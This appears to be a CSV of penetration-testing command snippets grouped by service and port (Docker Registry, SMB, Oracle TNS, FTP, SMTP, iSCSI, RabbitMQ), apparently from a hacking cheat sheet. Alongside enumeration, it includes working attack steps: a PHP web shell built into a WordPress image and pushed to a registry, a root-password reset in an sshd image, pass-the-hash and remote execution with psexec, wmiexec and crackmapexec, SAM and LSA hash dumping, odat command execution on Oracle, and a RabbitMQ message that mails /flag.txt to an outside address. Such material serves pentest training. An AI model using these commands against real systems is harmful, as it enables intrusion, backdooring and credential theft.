+{""name"":""ubuntu"",""tags"":[""14.04"",""12.04"",""18.04"",""16.04""]}
+
+#Get manifests
+curl -s http://192.251.36.3:5000/v2/ubuntu/manifests/latest
+{
+   ""schemaVersion"": 1,
+   ""name"": ""ubuntu"",
+   ""tag"": ""latest"",
+   ""architecture"": ""amd64"",
+   ""fsLayers"": [
+      {
+         ""blobSum"": ""sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935""
+      },
+      {
+         ""blobSum"": ""sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4""
+      },
+      {
+         ""blobSum"": ""sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10""
+      }
+   ],
+   ""history"": [
+      {
+         ""v1Compatibility"": ""{\""architecture\"":\""amd64\"",\""config\"":{\""Hostname\"":\""\"",\""Domainname\"":\""\"",\""User\"":\""\"",\""AttachStdin\"":false,\""AttachStdout\"":false,\""AttachStderr\"":false,\""Tty\"":false,\""OpenStdin\"":false,\""StdinOnce\"":false,\""Env\"":[\""PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""],\""Cmd\"":[\""/bin/sh\""],\""ArgsEscaped\"":true,\""Image\"":\""sha256:055936d3920576da37aa9bc460d70c5f212028bda1c08c0879aedf03d7a66ea1\"",\""Volumes\"":null,\""WorkingDir\"":\""\"",\""Entrypoint\"":null,\""OnBuild\"":null,\""Labels\"":null},\""container_config\"":{\""Hostname\"":\""\"",\""Domainname\"":\""\"",\""User\"":\""\"",\""AttachStdin\"":false,\""AttachStdout\"":false,\""AttachStderr\"":false,\""Tty\"":false,\""OpenStdin\"":false,\""StdinOnce\"":false,\""Env\"":[\""PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""],\""Cmd\"":[\""/bin/sh\"",\""-c\"",\""#(nop) COPY file:96c69e5db7e6d87db2a51d3894183e9e305a144c73659d5578d300bd2175b5d6 in /etc/network/if-post-up.d \""],\""ArgsEscaped\"":true,\""Image\"":\""sha256:055936d3920576da37aa9bc460d70c5f212028bda1c08c0879aedf03d7a66ea1\"",\""Volumes\"":null,\""WorkingDir\"":\""\"",\""Entrypoint\"":null,\""OnBuild\"":null,\""Labels\"":null},\""created\"":\""2019-05-13T14:06:51.794876531Z\"",\""docker_version\"":\""18.09.4\"",\""id\"":\""911999e848d2c283cbda4cd57306966b44a05f3f184ae24b4c576e0f2dfb64d0\"",\""os\"":\""linux\"",\""parent\"":\""ebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\""}""
+      },
+      {
+         ""v1Compatibility"": ""{\""id\"":\""ebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\"",\""parent\"":\""7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\"",\""created\"":\""2019-05-11T00:07:03.510395965Z\"",\""container_config\"":{\""Cmd\"":[\""/bin/sh -c #(nop)  CMD [\\\""/bin/sh\\\""]\""]},\""throwaway\"":true}""
+      },
+      {
+         ""v1Compatibility"": ""{\""id\"":\""7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\"",\""created\"":\""2019-05-11T00:07:03.358250803Z\"",\""container_config\"":{\""Cmd\"":[\""/bin/sh -c #(nop) ADD file:a86aea1f3a7d68f6ae03397b99ea77f2e9ee901c5c59e59f76f93adbb4035913 in / \""]}}""
+      }
+   ],
+   ""signatures"": [
+      {
+         ""header"": {
+            ""jwk"": {
+               ""crv"": ""P-256"",
+               ""kid"": ""DJNH:N6JL:4VOW:OTHI:BSXU:TZG5:6VPC:D6BP:6BPR:ULO5:Z4N4:7WBX"",
+               ""kty"": ""EC"",
+               ""x"": ""leyzOyk4EbEWDY0ZVDoU8_iQvDcv4hrCA0kXLVSpCmg"",
+               ""y"": ""Aq5Qcnrd-6RO7VhUS2KPpftoyjjBWVoVUiaPluXq4Fg""
+            },
+            ""alg"": ""ES256""
+         },
+         ""signature"": ""GIUf4lXGzdFk3aF6f7IVpF551UUqGaSsvylDqdeklkUpw_wFhB_-FVfshodDzWlEM8KI-00aKky_FJez9iWL0Q"",
+         ""protected"": ""eyJmb3JtYXRMZW5ndGgiOjI1NjQsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMS0wMS0wMVQyMDoxMTowNFoifQ""
+      }
+   ]
+}
+
+#Download one of the previously listed blobs
+curl http://10.10.10.10:5000/v2/ubuntu/blobs/sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935 --output blob1.tar
+
+#Inspect the insides of each blob
+tar -xf blob1.tar #After this,inspect the new folders and files created in the current directory
+",Unverified,1
+Registry,5000,None,NoNameAdded,No Description,"#Once you know which images the server is saving (/v2/_catalog) you can pull them
+docker pull 10.10.10.10:5000/ubuntu
+
+#Check the commands used to create the layers of the image
+docker history 10.10.10.10:5000/ubuntu
+#IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
+#ed05bef01522        2 years ago         ./run.sh                                        46.8MB              
+#<missing>           2 years ago         /bin/sh -c #(nop)  CMD [""./run.sh""]             0B                  
+#<missing>           2 years ago         /bin/sh -c #(nop)  EXPOSE 80                    0B                  
+#<missing>           2 years ago         /bin/sh -c cp $base/mysql-setup.sh /            499B                
+#<missing>           2 years ago         /bin/sh -c #(nop) COPY dir:0b657699b1833fd59…   16.2MB       
+
+#Run and get a shell
+docker run -it 10.10.10.10:5000/ubuntu bash #Leave this shell running
+docker ps #Using a different shell
+docker exec -it 7d3a81fe42d7 bash #Get ash shell inside docker container
+",Unverified,1
+Registry,5000,None,NoNameAdded,No Description,"# <?php echo shell_exec($_GET[""cmd""]); ?>
+",Unverified,1
+Registry,5000,None,NoNameAdded,No Description,"FROM 10.10.10.10:5000/wordpress
+COPY shell.php /app/
+RUN chmod 777 /app/shell.php
+",Unverified,1
+Registry,5000,None,NoNameAdded,No Description,"docker build -t 10.10.10.10:5000/wordpress .
+ #Create
+docker images
+docker push registry:5000/wordpress #Push it
+",Unverified,1
+Registry,5000,None,NoNameAdded,No Description,"docker pull 10.10.10.10:5000/sshd-docker-cli
+docker run -d 10.10.10.10:5000/sshd-docker-cli
+",Unverified,1
+Registry,5000,None,NoNameAdded,No Description,"docker cp 4c989242c714:/etc/ssh/sshd_config .
+",Unverified,1
+Registry,5000,None,NoNameAdded,No Description,"FROM 10.10.10.10:5000/sshd-docker-cli
+COPY sshd_config /etc/ssh/
+RUN echo root:password | chpasswd
+",Unverified,1
+Registry,5000,None,NoNameAdded,No Description,"docker build -t 10.10.10.10:5000/sshd-docker-cli .
+ #Create
+docker images
+docker push registry:5000/sshd-docker-cli #Push it
+",Unverified,1
+WHOIS,43,None,NoNameAdded,No Description,"whois -h <HOST> -p <PORT> ""domain.tld""
+echo ""domain.ltd"" | nc -vn <HOST> <PORT>
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"nbtscan -r 192.168.0.1/24
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"#!/bin/sh
+#Author: rewardone
+#Description:
+# Requires root or enough permissions to use tcpdump
+# Will listen for the first 7 packets of a null login
+# and grab the SMB Version
+#Notes:
+# Will sometimes not capture or will print multiple
+# lines. May need to run a second time for success.
+if [ -z $1 ]; then echo ""Usage: ./smbver.sh RHOST {RPORT}"" && exit; else rhost=$1; fi
+if [ ! -z $2 ]; then rport=$2; else rport=139; fi
+tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i ""samba\|s.a.m"" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n ""$rhost: "" &
+echo ""exit"" | smbclient -L $rhost 1>/dev/null 2>/dev/null
+echo """" && sleep .1
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"# msf> search type:exploit platform:windows target:2008 smb
+searchsploit microsoft smb
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"#Dump interesting information
+enum4linux -a [-u ""<username>"" -p ""<passwd>""] <IP>
+nmap --script ""safe or smb-enum-*"" -p 445 <IP>
+
+#Connect to the rpc
+rpcclient -U """" -N <IP> #No creds
+rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
+#You can use querydispinfo and enumdomusers to query user information
+
+#Dump user information
+/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
+/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
+
+#Map possible RPC endpoints
+/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
+/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
+/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"smbclient --no-pass -L //{IP} # Null user
+smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //{IP} #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
+smbmap -H {IP} [-P <PORT>] #Null user
+smbmap -u ""username"" -p ""password"" -H {IP} [-P <PORT>] #Creds
+smbmap -u ""username"" -p ""<NT>:<LM>"" -H {IP} [-P <PORT>] #Pass-the-Hash
+crackmapexec smb {IP} -u '' -p '' --shares #Null user
+crackmapexec smb {IP} -u 'username' -p 'password' --shares #Guest user
+crackmapexec smb {IP} -u 'username' -H '<HASH>' --shares #Guest user
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"#Connect using smbclient
+smbclient --no-pass //<IP>/<Folder>
+smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
+#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient
+
+#List with smbmap, without folder it list everything
+smbmap [-u ""username"" -p ""password""] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
+smbmap [-u ""username"" -p ""password""] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
+smbmap -u ""username"" -p ""<NT>:<LM>"" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"smbclient -U '%' -N \\\\{IP}\\<SHARE> # null session to connect to a windows share
+smbclient -U '<USER>' \\\\{IP}\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"#/bin/bash
+
+ip='<TARGET-IP-HERE>'
+shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')
+
+for share in ${shares[*]}; do
+    output=$(smbclient -U '%' -N \\\\$ip\\$share -c '') 
+
+    if [[ -z $output ]]; then 
+        echo ""[+] creating a null session is possible for $share"" # no output if command goes through, thus assuming that a session was created
+    else
+        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
+    fi
+done
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
+smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"mount -t cifs //x.x.x.x/share /mnt/share
+mount -t cifs -o ""username=user,password=password"" //x.x.x.x/share /mnt/share
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"#Search a file and download
+sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"#Download all
+smbclient //<IP>/<share>
+> mask """"
+> recurse
+> prompt
+> mget *
+#Download everything to current directory
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"# sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
+sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
+sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"smbclient --kerberos //ws01win10.domain.com/C$
+rpcclient -k ws01win10.domain.com
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"# apt-get install crackmapexec
+
+crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
+crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
+crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
+# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}
+
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"#If no password is provided, it will be prompted
+./psexec.py [[domain/]username[:password]@]<targetName or address>
+./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
+psexec \\192.168.122.66 -u Administrator -p 123456Ww
+psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"#If no password is provided, it will be prompted
+./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
+./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
+#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"#If no password is provided, it will be prompted
+./dcomexec.py [[domain/]username[:password]@]<targetName or address>
+./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
+#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"# ./atexec.py [[domain/]username[:password]@]<targetName or address> ""command""
+./atexec.py -hashes <LM:NT> administrator@10.10.10.175 ""whoami""
+",Unverified,1
+SMB,139,None,NoNameAdded,No Description,"nmap --script smb-brute -p 445 {IP}
+ridenum.py {IP} 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce eachusername
+",Unverified,1
+Modbus,502,None,NoNameAdded,No Description,"nmap --script modbus-discover -p 502 {IP}
+msf> use auxiliary/scanner/scada/modbusdetect
+msf> use auxiliary/scanner/scada/modbus_findunitid
+",Unverified,1
+Management,15672,None,NoNameAdded,No Description,"# POST /api/exchanges/%2F/amq.default/publish HTTP/1.1
+Host: 172.32.56.72:15672
+Authorization: Basic dGVzdDp0ZXN0
+Accept: */*
+Content-Type: application/json;charset=UTF-8
+Content-Length: 267
+
+{""vhost"":""/"",""name"":""amq.default"",""properties"":{""delivery_mode"":1,""headers"":{}},""routing_key"":""email"",""delivery_mode"":""1"",""payload"":""{\""to\"":\""zevtnax+ppp@gmail.com\"", \""attachments\"": [{\""path\"": \""/flag.txt\""}]}"",""headers"":{},""props"":{},""payload_encoding"":""string""}
+",Unverified,1
+ISCSI,3260,None,NoNameAdded,No Description,"# sudo apt-get install open-iscsi
+",Unverified,1
+ISCSI,3260,None,NoNameAdded,No Description,"iscsiadm -m node --targetname=""iqn.1992-05.com.emc:fl1001433000190000-3-vnxe"" -p 123.123.123.123:3260 --login
+Logging in to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] (multiple)
+Login to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] successful.
+",Unverified,1
+ISCSI,3260,None,NoNameAdded,No Description,"iscsiadm -m node --targetname=""iqn.1992-05.com.emc:fl1001433000190000-3-vnxe"" -p 123.123.123.123:3260 --logout
+Logging out of session [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260]
+Logout of [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] successful.
+",Unverified,1
+ISCSI,3260,None,NoNameAdded,No Description,"iscsiadm -m node --targetname=""iqn.1992-05.com.emc:fl1001433000190000-3-vnxe"" -p 123.123.123.123:3260
+# BEGIN RECORD 2.0-873
+node.name = iqn.1992-05.com.emc:fl1001433000190000-3-vnxe
+node.tpgt = 1
+node.startup = manual
+node.leading_login = No
+iface.hwaddress = <empty>
+iface.ipaddress = <empty>
+iface.iscsi_ifacename = default
+iface.net_ifacename = <empty>
+iface.transport_name = tcp
+iface.initiatorname = <empty>
+iface.bootproto = <empty>
+iface.subnet_mask = <empty>
+iface.gateway = <empty>
+iface.ipv6_autocfg = <empty>
+iface.linklocal_autocfg = <empty>
+iface.router_autocfg = <empty>
+iface.ipv6_linklocal = <empty>
+iface.ipv6_router = <empty>
+iface.state = <empty>
+iface.vlan_id = 0
+iface.vlan_priority = 0
+iface.vlan_state = <empty>
+iface.iface_num = 0
+iface.mtu = 0
+iface.port = 0
+node.discovery_address = 192.168.xx.xx
+node.discovery_port = 3260
+node.discovery_type = send_targets
+node.session.initial_cmdsn = 0
+node.session.initial_login_retry_max = 8
+node.session.xmit_thread_priority = -20
+node.session.cmds_max = 128
+node.session.queue_depth = 32
+node.session.nr_sessions = 1
+node.session.auth.authmethod = None
+node.session.auth.username = <empty>
+node.session.auth.password = <empty>
+node.session.auth.username_in = <empty>
+node.session.auth.password_in = <empty>
+node.session.timeo.replacement_timeout = 120
+node.session.err_timeo.abort_timeout = 15
+node.session.err_timeo.lu_reset_timeout = 30
+node.session.err_timeo.tgt_reset_timeout = 30
+node.session.err_timeo.host_reset_timeout = 60
+node.session.iscsi.FastAbort = Yes
+node.session.iscsi.InitialR2T = No
+node.session.iscsi.ImmediateData = Yes
+node.session.iscsi.FirstBurstLength = 262144
+node.session.iscsi.MaxBurstLength = 16776192
+node.session.iscsi.DefaultTime2Retain = 0
+node.session.iscsi.DefaultTime2Wait = 2
+node.session.iscsi.MaxConnections = 1
+node.session.iscsi.MaxOutstandingR2T = 1
+node.session.iscsi.ERL = 0
+node.conn[0].address = 192.168.xx.xx
+node.conn[0].port = 3260
+node.conn[0].startup = manual
+node.conn[0].tcp.window_size = 524288
+node.conn[0].tcp.type_of_service = 0
+node.conn[0].timeo.logout_timeout = 15
+node.conn[0].timeo.login_timeout = 15
+node.conn[0].timeo.auth_timeout = 45
+node.conn[0].timeo.noop_out_interval = 5
+node.conn[0].timeo.noop_out_timeout = 5
+node.conn[0].iscsi.MaxXmitDataSegmentLength = 0
+node.conn[0].iscsi.MaxRecvDataSegmentLength = 262144
+node.conn[0].iscsi.HeaderDigest = None
+node.conn[0].iscsi.DataDigest = None
+node.conn[0].iscsi.IFMarker = No
+node.conn[0].iscsi.OFMarker = No
+# END RECORD
+",Unverified,1
+AFP,548,None,NoNameAdded,No Description,"# msf> use auxiliary/scanner/afp/afp_server_info
+nmap -sV --script ""afp-* and not dos and not brute"" -p <PORT> <IP>
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"nmap --script ""oracle-tns-version"" -p 1521 -T4 -sV {IP}
+msf> use auxiliary/scanner/oracle/tnslsnr_version
+#apt install tnscmd10g
+tnscmd10g version -p 1521 -h {IP}
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"tnscmd10g status-p 1521 -h {IP} #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
+
+#msf1
+msf> use auxiliary/scanner/oracle/sid_enum
+msf> set rhost {IP}
+msf> run
+#msf2
+msf> use auxiliary/admin/oracle/tnscmd
+msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
+msf> set rhost {IP}
+msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 {IP} oracle-sid
+patator oracle_login host={IP} sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
+./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
+msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
+nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
+#Example:
+sqplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"#apt install oscanner
+oscanner -s <IP> -P <PORT>
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"# git clone https://github.com/quentinhardy/odat.git
+cd odat
+./odat.py --help #It shouldn't be problems in Kali
+./odat.py all -s <IP> -p <PORT>
+./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"# git clone https://github.com/quentinhardy/odat.git
+cd odat
+./odat.py #It shouldn't be problems in Kali
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"# ./odat.py java -s {IP} -U <username> -P <password> -d <SID> --exec COMMAND
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"# ./odat.py dbmsscheduler -s {IP} -d <SID> -U <username> -P <password> --exec ""C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK""
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"# ./odat.py externaltable -s {IP} -U <username> -P <password> -d <SID> --exec ""C:/windows/system32"" ""calc.exe""
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"# ./odat.py utlfile -s {IP} -d <SID> -U <username> -P <password> --getFile ""C:/test"" token.txt token.txt
+./odat.py externaltable -s {IP} -U <username> -P <password> -d <SID> --getFile ""C:/test"" ""my4.txt"" ""my""
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"# ./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
+",Unverified,1
+Listener,1521,None,NoNameAdded,No Description,"# msf> use auxiliary/sqli/oracle/lt_findricset_cursor
+",Unverified,1
+FTP,21,None,NoNameAdded,No Description,"telnet -vn {IP} 21
+openssl s_client -connect crossfit.htb:21 -starttls ftp #Get certificate if any
+",Unverified,1
+FTP,21,None,NoNameAdded,No Description,"ftp {IP}
+>anonymous
+>anonymous
+>ls -a # List all files (even hidden) (yes, they could be hidden)
+>binary #Set transmission to binary instead of ascii
+>ascii #Set transmission to ascii instead of binary
+>bye #exit
+",Unverified,1
+FTP,21,None,NoNameAdded,No Description,"ftp://anonymous:anonymous@10.10.10.98
+",Unverified,1
+FTP,21,None,NoNameAdded,No Description,"wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
+wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all
+",Unverified,1
+SMTP/s,25,None,NoNameAdded,No Description,"# nc -vn {IP} 25
+",Unverified,1
+SMTP/s,25,None,NoNameAdded,No Description,"openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
+openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
+",Unverified,1
+SMTP/s,25,None,NoNameAdded,No Description,"dig +short mx google.com
+",Unverified,1
+SMTP/s,25,None,NoNameAdded,No Description,"nmap -p25 --script smtp-commands 10.10.10.10
+",Unverified,1
+SMTP/s,25,None,NoNameAdded,No Description,"root@kali: telnet example.com 587 
+220 example.com SMTP Server Banner 
+>> HELO 
+250 example.com Hello [x.x.x.x] 
+>> AUTH NTLM 334 
+NTLM supported 
+>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 
+334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
+",Unverified,1
+SMTP/s,25,None,NoNameAdded,No Description,"# $ telnet 10.0.10.1 25
+Trying 10.0.10.1...
+Connected to 10.0.10.1.
+Escape character is '^]'.
+220 myhost ESMTP Sendmail 8.9.3
+HELO x
+250 myhost Hello [10.0.0.99], pleased to meet you
+MAIL FROM:test@test.org
+250 2.1.0 test@test.org... Sender ok
+RCPT TO:test
+550 5.1.1 test... User unknown
+RCPT TO:admin
+550 5.1.1 admin... User unknown
+RCPT TO:ed
+250 2.1.5 ed... Recipient ok
+",Unverified,1
